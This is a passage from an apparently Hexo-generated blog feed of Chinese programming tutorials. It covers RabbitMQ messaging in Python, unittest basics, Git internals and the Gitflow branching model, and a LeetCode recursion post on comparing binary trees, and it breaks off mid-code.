class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pika<br><br><span class="hljs-comment"># 连接到本地RabbitMQ服务器</span><br>connection = pika.BlockingConnection(pika.ConnectionParameters(<span class="hljs-string">&#x27;localhost&#x27;</span>))<br>channel = connection.channel()<br><br><span class="hljs-comment"># 声明队列</span><br>channel.queue_declare(queue=<span class="hljs-string">&#x27;hello&#x27;</span>)<br><br><span class="hljs-comment"># 发送消息</span><br>message = <span class="hljs-string">&quot;Hello RabbitMQ!&quot;</span><br>channel.basic_publish(exchange=<span class="hljs-string">&#x27;&#x27;</span>,<br>                      routing_key=<span class="hljs-string">&#x27;hello&#x27;</span>,<br>                      body=message)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot; [x] Sent &#x27;<span class="hljs-subst">&#123;message&#125;</span>&#x27;&quot;</span>)<br><br><span class="hljs-comment"># 关闭连接</span><br>connection.close()<br></code></pre></td></tr></table></figure><h2 id="消费者">4.2 消费者</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pika<br><br><span class="hljs-comment"># 连接到本地RabbitMQ服务器</span><br>connection = pika.BlockingConnection(pika.ConnectionParameters(<span class="hljs-string">&#x27;localhost&#x27;</span>))<br>channel = connection.channel()<br><br><span class="hljs-comment"># 声明队列</span><br>channel.queue_declare(queue=<span class="hljs-string">&#x27;hello&#x27;</span>)<br><br><span class="hljs-comment"># 定义回调函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">callback</span>(<span class="hljs-params">ch, method, properties, body</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot; [x] Received <span class="hljs-subst">&#123;body&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 告诉RabbitMQ使用callback函数来接收消息</span><br>channel.basic_consume(queue=<span class="hljs-string">&#x27;hello&#x27;</span>,<br>                      on_message_callback=callback,<br>                      auto_ack=<span class="hljs-literal">True</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; [*] Waiting for messages. To exit press CTRL+C&#x27;</span>)<br>channel.start_consuming()<br></code></pre></td></tr></table></figure><p><strong>参考资料：</strong></p><ol type="1"><li><ahref="https://javaguide.cn/high-performance/message-queue/message-queue.html">消息队列基础知识总结</a></li><li><ahref="https://developer.aliyun.com/article/953777">秒懂消息队列MQ，万字总结带你全面了解消息队列MQ</a></li><li><ahref="https://cloud.tencent.com/developer/article/1006035">消息队列及常见消息队列介绍</a></li><li><ahref="https://www.cnblogs.com/qingbaizhinian/p/14476728.html">消息队列的介绍和常用开源消息队列的对比</a></li><li><ahref="https://blog.csdn.net/u011709538/article/details/131396367">手把手教你，本地RabbitMQ服务搭建（windows）_搭建mq服务器-CSDN博客</a></li><li><a href="https://www.cnblogs.com/shenh/p/10497244.html">python操作RabbitMq详解</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>进阶篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>单元测试</title>
    <link href="/2024/06/07/Python/%E5%9F%BA%E7%A1%80%E7%AF%87/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"/>
    <url>/2024/06/07/Python/%E5%9F%BA%E7%A1%80%E7%AF%87/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="简介">1. 简介</h1><p>unittest 单元测试框架最初受到 JUnit的启发，与其他语言的主要单元测试框架有相似之处。它支持测试自动化、共享测试的设置和关闭代码、将测试聚合成集合，以及测试与报告框架的独立性。</p><h1 id="重要概念">2. 重要概念</h1><ul><li><strong>测试装置</strong>：测试装置表示执行一个或多个测试所需的准备工作，以及任何相关的清理操作。例如，这可能涉及创建临时或代理数据库、目录或启动服务器进程。</li><li><strong>测试用例</strong>：测试用例是测试的单个单元。unittest提供了一个基类 TestCase，可用于创建新的测试用例。</li><li><strong>测试套件</strong>：测试套件是测试用例、测试套件或两者的集合。它用于汇集应一起执行的测试。</li><li><strong>测试运行器</strong>：测试运行器是一个组件，负责协调测试的执行，并将结果提供给用户。运行程序可以使用图形界面、文本界面，或返回一个特殊值来表示执行测试的结果。</li></ul><h1 id="基本示例">3. 基本示例</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unittest<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TestStringMethods</span>(unittest.TestCase):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_upper</span>(<span class="hljs-params">self</span>):<br>        self.assertEqual(<span class="hljs-string">&#x27;foo&#x27;</span>.upper(), <span class="hljs-string">&#x27;FOO&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_isupper</span>(<span class="hljs-params">self</span>):<br>        self.assertTrue(<span class="hljs-string">&#x27;FOO&#x27;</span>.isupper())<br>        self.assertFalse(<span class="hljs-string">&#x27;Foo&#x27;</span>.isupper())<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_split</span>(<span class="hljs-params">self</span>):<br>        s = <span class="hljs-string">&#x27;hello world&#x27;</span><br>        self.assertEqual(s.split(), [<span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-string">&#x27;world&#x27;</span>])<br>        <span class="hljs-comment"># check that s.split fails when the separator is not a string</span><br>        <span class="hljs-keyword">with</span> self.assertRaises(TypeError):<br>            s.split(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    unittest.main()<br></code></pre></td></tr></table></figure><p>测试用例通过子类化创建<code>unittest.TestCase</code>。三个单独的测试是用名称以<code>test</code>开头的方法定义的。这种命名约定可告知测试运行程序哪些方法代表测试。</p><p>每个测试的关键是调用<code>assertEqual()</code>检查预期结果；<code>assertTrue()</code>或<code>assertFalse()</code>验证条件；或<code>assertRaises()</code>验证是否引发特定异常。使用这些方法代替<code>assert</code>语句，测试运行程序就能累计所有测试结果并生成报告。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>基础篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Git和Gitflow</title>
    <link href="/2024/06/06/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Git%E5%92%8CGitflow/"/>
    <url>/2024/06/06/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Git%E5%92%8CGitflow/</url>
    
    <content type="html"><![CDATA[<h1 id="git">1. Git</h1><p>Git是一种分布式版本控制系统，用于跟踪文件和项目的变化。它最初由LinusTorvalds为了管理Linux内核开发而创建，现已成为许多软件开发项目的标准工具。Git的主要优势之一是其分布式性，这意味着每个开发者都拥有项目的完整版本历史记录的副本，而不仅仅是一个中央存储库的快照。</p><p>Git的工作方式基于一系列提交（commits），每个提交都记录了文件的状态以及相关的元数据，例如提交者、提交时间等。开发者可以创建分支（branch），从而可以并行开发不同的功能或修复不同的bug，而不会影响主线（master或main）的稳定性。一旦开发完成，分支可以合并（merge）回主线。</p><h2 id="版本控制">1.1 版本控制</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406061502947.png"alt="image-20240606145857781" /><figcaption aria-hidden="true">image-20240606145857781</figcaption></figure><ol type="1"><li>Version1：资料夹中新增三份文件，分别为<code>A</code>、<code>B</code>。</li><li>Version2：新增<code>C</code>、<code>D</code>，则原本的<code>A</code>、<code>B</code>会指向Version1 的<code>A</code>、<code>B</code>。</li><li>Version3：修改<code>B</code>、<code>C</code>，则<code>A</code>会指向Version 1的<code>A</code>，<code>D</code>会指向Version 2 的<code>D</code>。</li></ol><h2 id="资料结构">1.2 资料结构</h2><p>Git有两种资料结构，分别为<code>物件</code>以及<code>索引</code>。</p><h3 id="物件">1.2.1 物件</h3><p>物件是一种不可变的（immutable）档案类型，存放于<code>.git/object/</code>，物件都是透过档案内容进行SHA1杂凑出Hash 值来当作档案名称，而物件类型可以再分为三种：</p><ul><li>blob 物件：记载档案内容。</li><li>tree 物件：记载特定资料夹下有哪些档案，以及档案对应的blob物件档名，也可以包含tree 物件，功能类似资料夹的概念。</li><li>commit 物件：会记录着某个tree 物件、parent （上一次的commit物件）等资讯。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406061502948.png"alt="image-20240606150115347" /><figcaption aria-hidden="true">image-20240606150115347</figcaption></figure><p>还有一种并非以Hash 值当作档案名称的物件：</p><ul><li>tag 物件：在新增tag时会出现，并存放于<code>.git/refs</code>当中，会固定指向某个Commit物件。</li></ul><h3 id="索引">1.2.2 索引</h3><p>位于<code>.git/index</code>里，为一个二进位档案，它会用来记录哪些档案需要提交到Repository，此索引档通常保存着Git储存库中特定的版本状态，介于Working space 与Repository 之间。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406061502949.png"alt="image-20240606150224208" /><figcaption aria-hidden="true">image-20240606150224208</figcaption></figure><h2 id="常用命令">1.3 常用命令</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406201014992.png"alt="image-20240620101441744" /><figcaption aria-hidden="true">image-20240620101441744</figcaption></figure><ul><li>Workspace：工作区</li><li>Index / Stage：暂存区</li><li>Repository：仓库区（或本地仓库）</li><li>Remote：远程仓库</li></ul><h1 id="gitflow">2. Gitflow</h1><h2 id="简介">2.1 简介</h2><p>Gitflow工作流(Gitflow Workflow)是2010年由VincentDriessen提出的。它定义了一整套完善的基于Git分支模型的框架，结合了版本发布的研发流程，适合管理具有固定发布周期的大型项目。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406061502950.png"alt="image-20240606114106334" /><figcaption aria-hidden="true">image-20240606114106334</figcaption></figure><h2 id="主要分支">2.2 主要分支</h2><p>该开发模式的核心灵感来源于现有模式。中央仓库有两个主要分支，它们的生命周期都是无限的。<code>master</code>分支在<code>origin</code>上应该对每个Git用户都很熟悉。与<code>master</code>分支平行存在的是另一个叫做<code>develop</code>的分支。</p><ul><li><code>origin/master</code>：HEAD 的源代码始终反映生产就绪状态。</li><li><code>origin/develop</code>：HEAD的源代码始终反映最新的开发变更，为下一个版本做准备。有些人会称其为“集成分支”。</li></ul><p>当<code>develop</code>分支的源代码达到稳定点并准备发布时，所有更改应以某种方式合并回<code>master</code>分支，然后标记为发布版本。因此，每次将更改合并回master分支时，根据定义，这都是一次新的生产发布。我们对此非常严格，以至于理论上，我们可以使用一个Git钩子脚本，每次在<code>master</code>上有提交时，自动构建并将我们的软件发布到生产服务器上。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406061502951.png"alt="image-20240606113346395" /><figcaption aria-hidden="true">image-20240606113346395</figcaption></figure><h2 id="辅助分支">2.3 辅助分支</h2><p>除了主要分支<code>master</code>和<code>develop</code>之外，我们的开发模型还使用了各种辅助分支，以帮助团队成员之间的并行开发，便于跟踪功能，准备生产发布，并协助快速修复生产环境中的问题。与主要分支不同，这些分支的生命周期是有限的，因为它们最终会被删除。我们可能使用的不同类型的分支有：</p><ul><li>功能分支 (Feature branches)</li><li>发布分支 (Release branches)</li><li>热修复分支 (Hotfix branches)</li></ul><p>每种分支都有特定的用途，并且严格规定了其起源分支和必须合并的目标分支。我们将逐一介绍它们。从技术角度来看，这些分支绝不是“特殊的”。这些分支类型是根据我们如何使用它们来分类的。当然，它们都是普通的Git 分支。</p><h3 id="feature分支">2.3.1 Feature分支</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406061502952.png"alt="image-20240606133415423" /><figcaption aria-hidden="true">image-20240606133415423</figcaption></figure><ul><li>可能分支自： <code>develop</code></li><li>必须合并回： <code>develop</code></li><li>分支命名规范： 任何名称，但不能是<code>master</code>、<code>develop</code>、<code>release-*</code> 或<code>hotfix-*</code></li></ul><p>功能分支用于开发即将发布或远期发布的新功能。当开始开发一个功能时，可能并不知道该功能将被包含在哪个目标版本中。功能分支的本质在于它在功能开发过程中存在，但最终要么被合并回<code>develop</code>，要么被废弃。功能分支通常只存在于开发者的仓库中，而不是在<code>origin</code> 中。</p><h4 id="创建">2.3.1.1 创建</h4><p>当开始开发新功能时，从<code>develop</code>分支中分支出来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 切换到新分支“myfeature”</span><br>$ git checkout -b myfeature develop<br></code></pre></td></tr></table></figure><h4 id="合并">2.3.1.2 合并</h4><p>已完成的功能可以合并到<code>develop</code>分支中，以便将它们添加到即将发布的版本中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 切换到分支“develop” </span><br>$ git checkout develop<br><span class="hljs-comment"># 更新 ea1b82a..05e9557 </span><br><span class="hljs-comment"># (更改摘要) </span><br>$ git merge --no-ff myfeature<br><span class="hljs-comment"># 删除分支 myfeature (原为 05e9557)</span><br>$ git branch -d myfeature<br><span class="hljs-comment"># 将更新后的 develop 分支推送到远程仓库</span><br>$ git push origin develop<br></code></pre></td></tr></table></figure><p><code>--no-ff</code>标志使合并始终创建新的提交对象，即使合并可以通过快进执行。这避免了丢失有关功能分支历史存在的信息，并将所有共同添加该功能的提交分组在一起。比较：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406061502953.png"alt="image-20240606134140591" /><figcaption aria-hidden="true">image-20240606134140591</figcaption></figure><p>在后一种情况下，从 Git历史记录中无法看出哪些提交对象一起实现了某个功能——你需要手动阅读所有的日志消息。撤销整个功能（即一组提交）在这种情况下是一件非常头疼的事，而如果使用了<code>--no-ff</code>标志，这将变得很容易。是的，这将创建一些（空的）提交对象，但收益远大于成本。</p><h3 id="release分支">2.3.2 Release分支</h3><ul><li>可能分支自：<code>develop</code></li><li>必须合并回：<code>develop</code>和<code>master</code></li><li>分支命名约定：<code>release-*</code></li></ul><p>当积累了足够多的已完成特性，或者预定的系统发布周期临近的时候，我们就会从<code>develop</code>分支创建出一个<code>Release</code>分支，专门用来做和当前版本发布有关的工作。<code>Release</code>分支一旦开出来以后，就不允许再有新的特性被加入到这个分支了，只有bug修复或者文档编辑之类的工作才允许进入该分支。</p><p><code>Release</code>分支上的内容最终会被合并到<code>master</code>分支，等版本发布的时候，我们通常还会为<code>master</code>分支加上带有相应版本号的tag。同时，<code>Release</code>分支也会被合并到<code>develop</code>分支。<code>Release</code>分支上的内容代表当前版本在发布之前的准备工作，<code>develop</code>分支上的内容则代表下一个版本的开发工作，两者是可以并行展开的。</p><h4 id="创建-1">2.3.2.1 创建</h4><p>发布分支是从<code>develop</code>分支创建的。例如，假设版本 1.1.5是当前的生产版本，我们即将发布一个重要版本。状态<code>develop</code>已准备好发布“下一个版本”，我们已决定将其定为版本1.2（而不是 1.1.6 或2.0）。因此，我们分支出来并为发布分支指定一个反映新版本号的名称：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 切换到新分支“release-1.2”</span><br>$ git checkout -b release-1.2 develop<br><span class="hljs-comment"># 文件修改成功，版本升级为 1.2。</span><br>$ ./bump-version.sh 1.2<br><span class="hljs-comment"># [release-1.2 74d9424] 版本号升级为 1.2</span><br><span class="hljs-comment"># 修改了 1 个文件，插入了 1 行(+)，删除了 1 行(-)</span><br>$ git commit -a -m “版本号升级为 1.2” <br></code></pre></td></tr></table></figure><p>在创建新分支并切换到它之后，我们会升级版本号。在这里，<code>bump-version.sh</code>是一个虚构的 shell脚本，它会更改工作副本中的一些文件以反映新版本。（当然，这可以是手动更改——关键是一些文件会发生变化。）然后，新的版本号被提交。</p><p>这个新分支可能会存在一段时间，直到确定可以发布。在此期间，可能会在此分支（而不是在分支上<code>develop</code>）应用错误修复。严禁在此处添加大型新功能。它们必须合并到<code>develop</code> 分支中，因此必须等待下一个重大版本发布。</p><h4 id="合并-1">2.3.2.2 合并</h4><p>在发布分支的状态准备好成为一个真正的发布时，需要执行一些操作。首先，发布分支被合并到<code>master</code> 分支（因为根据定义，<code>master</code>上的每个提交都是一个新的发布）。接下来，在 <code>master</code>分支上的这个提交必须被打上标签，以便将来易于引用到这个历史版本。最后，发布分支上所做的更改需要合并回<code>develop</code> 分支，以便未来的发布也包含这些错误修复。</p><p>在 Git 中的前两个步骤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 切换到分支 &#x27;master&#x27;</span><br>$ git checkout master<br><span class="hljs-comment"># 将 release-1.2 分支的更改合并到 master 分支 </span><br>$ git merge --no-ff release-1.2<br><span class="hljs-comment"># 创建一个名为 1.2 的标签。这个标签通常用于标识发布的版本号。</span><br>$ git tag -a 1.2<br></code></pre></td></tr></table></figure><p>发布现已完成，并已标记以供将来引用。为了保留在发布分支中所做的更改，我们需要将它们合并回<code>develop</code>。在Git 中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 切换到分支“develop” </span><br>$ git checkout develop<br><span class="hljs-comment"># 将 release-1.2 分支的更改合并到 develop 分支 </span><br>$ git merge --no-ff release-1.2<br></code></pre></td></tr></table></figure><p>这一步很可能会导致合并冲突（尤其是，因为我们已经更改了版本号）。如果出现合并冲突，就解决冲突并提交。现在我们真正完成了，发布分支可以删除了，因为我们不再需要它了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git branch -d release-1.2<br></code></pre></td></tr></table></figure><h3 id="hotfix分支">2.3.3 Hotfix分支</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406061502954.png"alt="image-20240606142024283" /><figcaption aria-hidden="true">image-20240606142024283</figcaption></figure><ul><li>可能分支自：<code>master</code></li><li>必须合并回：<code>develop</code>和<code>master</code></li><li>分支命名约定：<code>hotfix-*</code></li></ul><p>热修复分支与发布分支非常相似，因为它们也旨在为新的生产发布做准备，尽管是不计划的。它们的出现源于对生产版本不良状态的立即处理需求。当必须立即解决生产版本中的关键错误时，可以从标记了生产版本的<code>master</code>分支上分支出一个热修复分支。其本质在于团队成员的工作（在<code>develop</code>分支上）可以继续进行，同时另一个人正在准备快速的生产修复。</p><h4 id="创建-2">2.3.3.1 创建</h4><p>热修复分支是从 master 分支创建的。例如，假设版本 1.2是当前正在运行的生产发布版本，由于一个严重的错误而导致问题。但 develop分支上的更改尚不稳定。这时我们可以分支出一个热修复分支并开始修复问题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建了一个名为 hotfix-1.2.1 的新分支，并将基础分支指定为 master。</span><br>$ git checkout -b hotfix-1.2.1 master<br><span class="hljs-comment"># 运行了一个名为 bump-version.sh 的脚本，将版本号更新为 1.2.1。</span><br>$ ./bump-version.sh 1.2.1<br><span class="hljs-comment"># 提交了版本号更新的更改</span><br>$ git commit -a -m <span class="hljs-string">&quot;Bumped version number to 1.2.1&quot;</span><br></code></pre></td></tr></table></figure><p>分支之后不要忘记提升版本号！然后，修复该错误并在一个或多个单独的提交中提交修复。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git commit -m <span class="hljs-string">&quot;修复了严重的生产问题&quot;</span> <br></code></pre></td></tr></table></figure><h4 id="合并-2">2.3.3.2 合并</h4><p>完成后，需要将错误修复合并回<code>master</code>，但也需要合并回<code>develop</code>，以确保错误修复也包含在下一个版本中。这与发布分支的完成方式完全相似。首先，更新<code>master</code>并标记版本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 切换到分支 &#x27;master&#x27; </span><br>$ git checkout master<br><span class="hljs-comment"># 递归合并。（变更摘要）</span><br>$ git merge --no-ff hotfix-1.2.1<br><span class="hljs-comment"># 创建标签</span><br>$ git tag -a 1.2.1<br></code></pre></td></tr></table></figure><p>接下来，也要在 <code>develop</code>分支中包含这个 bug 修复：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 切换到分支“develop”</span><br>$ git checkout develop<br> <span class="hljs-comment"># 递归合并。（变更摘要）</span><br>$ git merge --no-ff hotfix-1.2.1<br></code></pre></td></tr></table></figure><p>唯一的例外是，当存在一个发布分支时，热修复的更改需要合并到该发布分支，而不是<code>develop</code> 分支。将 bug修复反向合并到发布分支最终会导致在发布分支完成时，该 bug 修复也会合并到<code>develop</code> 分支。（如果 <code>develop</code>分支中的工作立即需要这个 bug修复，并且不能等待发布分支完成，那么你也可以立即将 bug 修复合并到<code>develop</code> 分支。）最后，删除临时分支：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git branch -d hotfix-1.2.1<br></code></pre></td></tr></table></figure><p><strong>参考资料：</strong></p><ol type="1"><li><ahref="https://www.bilibili.com/video/BV1r3411F7kn/?spm_id_from=333.788&amp;vd_source=5a5397ea8e931fbb28195dfdfa5e1b03">Git工作流和核心原理| GitHub基本操作 | VS Code里使用Git和关联GitHub</a></li><li><ahref="https://www.bilibili.com/video/BV1RC411W7UE/?spm_id_from=333.788&amp;vd_source=5a5397ea8e931fbb28195dfdfa5e1b03">给学完Git，还不会用GitHub的朋友们</a></li><li><ahref="https://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html">常用Git 命令清单</a></li><li><a href="https://www.explainthis.io/zh-hant/swe/git-flow">Git 和GitFlow 是什么？如何应用？</a></li><li><ahref="https://nvie.com/posts/a-successful-git-branching-model/">成功的Git 分支模型</a></li><li><ahref="https://morningspace.github.io/tech/git-workflow-4/">Git工作流面面观——Gitflow工作流</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>递归篇</title>
    <link href="/2024/05/14/LeetCode/%E9%80%92%E5%BD%92%E7%AF%87/"/>
    <url>/2024/05/14/LeetCode/%E9%80%92%E5%BD%92%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="二叉树相关问题">1. 二叉树相关问题</h1><h2 id="相同的树">相同的树</h2><blockquote><p>法一：深度优先搜索。如果两个二叉树都为空，则两个二叉树相同。如果两个二叉树中有且只有一个为空，则两个二叉树一定不相同。如果两个二叉树都不为空，那么首先判断它们的根节点的值是否相同，若不相同则两个二叉树一定不同，若相同，再分别判断两个二叉树的左子树是否相同以及右子树是否相同。这是一个递归的过程，因此可以使用深度优先搜索，递归地判断两个二叉树是否相同。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isSameTree</span><span class="hljs-params">(TreeNode* p, TreeNode* q)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">nullptr</span> &amp;&amp; q == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">nullptr</span> || q == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (p-&gt;val != q-&gt;val) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">isSameTree</span>(p-&gt;left, q-&gt;left) &amp;&amp;<br>                   <span class="hljs-built_in">isSameTree</span>(p-&gt;right, q-&gt;right);<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：广度优先搜索。使用两个队列分别存储两个二叉树的节点。初始时将两个二叉树的根节点分别加入两个队列。每次从两个队列各取出一个节点，进行如下比较操作。</p><ol type="1"><li>比较两个节点的值，如果两个节点的值不相同则两个二叉树一定不同；</li><li>如果两个节点的值相同，则判断两个节点的子节点是否为空，如果只有一个节点的左子节点为空，或者只有一个节点的右子节点为空，则两个二叉树的结构不同，因此两个二叉树一定不同；</li><li>如果两个节点的子节点的结构相同，则将两个节点的非空子节点分别加入两个队列，子节点加入队列时需要注意顺序，如果左右子节点都不为空，则先加入左子节点，后加入右子节点。</li></ol><p>如果搜索结束时两个队列同时为空，则两个二叉树相同。如果只有一个队列为空，则两个二叉树的结构不同，因此两个二叉树不同。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isSameTree</span><span class="hljs-params">(TreeNode* p, TreeNode* q)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">nullptr</span> &amp;&amp; q == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">nullptr</span> || q == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        queue&lt;TreeNode*&gt; queue1, queue2;<br>        queue1.<span class="hljs-built_in">push</span>(p);<br>        queue2.<span class="hljs-built_in">push</span>(q);<br>        <span class="hljs-keyword">while</span> (!queue1.<span class="hljs-built_in">empty</span>() &amp;&amp; !queue2.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-keyword">auto</span> node1 = queue1.<span class="hljs-built_in">front</span>();<br>            